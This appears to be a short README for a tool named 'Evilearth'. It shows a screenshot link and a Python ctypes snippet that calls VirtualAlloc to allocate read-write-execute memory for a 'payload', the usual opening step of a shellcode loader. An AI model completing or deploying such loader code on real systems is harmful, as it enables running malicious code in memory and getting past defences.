
```
 _____         _  _                     _    _     
|  ___|       (_)| |                   | |  | |    
| |__  __   __ _ | |  ___   __ _  _ __ | |_ | |__  
|  __| \ \ / /| || | / _ \ / _` || '__|| __|| '_ \ 
| |___  \ V / | || ||  __/| (_| || |   | |_ | | | |
\____/   \_/  |_||_| \___| \__,_||_|    \__||_| |_|
                                                   
                                                   
```

## 运行效果  

<img width="798" height="491" alt="屏幕截图 2026-06-23 113434" src="https://github.com/user-attachments/assets/f48be5b2-6dec-4565-88c5-be0bfec7adbc" />

```python
addr = kernel32.VirtualAlloc(
    ctypes.c_void_p(0),
    ctypes.c_int(len(payload)),
    ctypes.c_int(0x3000),    # MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40)       # PAGE_EXECUTE_READWRITE 
)
```



